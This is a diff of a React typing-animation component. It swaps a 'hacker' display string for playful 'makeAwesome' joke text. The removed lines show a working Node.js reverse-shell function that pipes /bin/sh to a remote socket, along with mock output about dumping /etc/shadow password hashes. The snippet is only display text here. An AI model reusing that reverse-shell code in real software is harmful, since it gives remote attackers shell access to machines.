@@ -4,39 +4,33 @@
 import { useState, useEffect, useRef } from 'react';
 import { gsap } from 'gsap';
 
-const codeSnippet = `[~] Initializing system analysis...
-[+] Connecting to secure server: 192.168.1.101...
-[+] Connection established.
-[~] Bypassing firewall...
-[!] Firewall bypassed. Access granted.
+const codeSnippet = `[~] Initializing user session...
+[+] Authenticating credentials...
+[+] Access granted. Welcome, user.
 
-// Spawning reverse shell...
-void function connect_back(host, port) {
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(port, host, function() {
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return;
-}();
+[~] Acquiring attention...
+[+] Attention module engaged.
+[~] Calibrating consumer happiness matrix...
 
-[~] Executing payload...
-[+] System compromised. Root access obtained.
-> Accessing /etc/shadow...
-> Dumping password hashes...
-...
-root:$6$aReallyLongSalt$anotherLongString...
-daemon:*:19659:0:99999:7:::
-bin:*:19659:0:99999:7:::
-sys:*:19659:0:99999:7:::
+// Deploying creative solution...
+function makeAwesome(input) {
+    let output = input;
+    output += ' + 🚀'; // Add rocket
+    output = output.toUpperCase();
+    for (let i=0; i<5; i++) {
+        console.log('Making it awesome...');
+    }
+    return output;
+}
 
-> Mission accomplished.
-> Erasing tracks...
-> Disconnecting.`;
+[~] Executing makeAwesome('project')...
+[+] Project is now awesome.
+> Analyzing results...
+> Consumer happiness levels: 110%
+> Satisfaction index: CRITICAL
+
+> Mission successful.
+> Logging out...`;
 
 const CodeTypingEffect = () => {
   const [text, setText] = useState('');
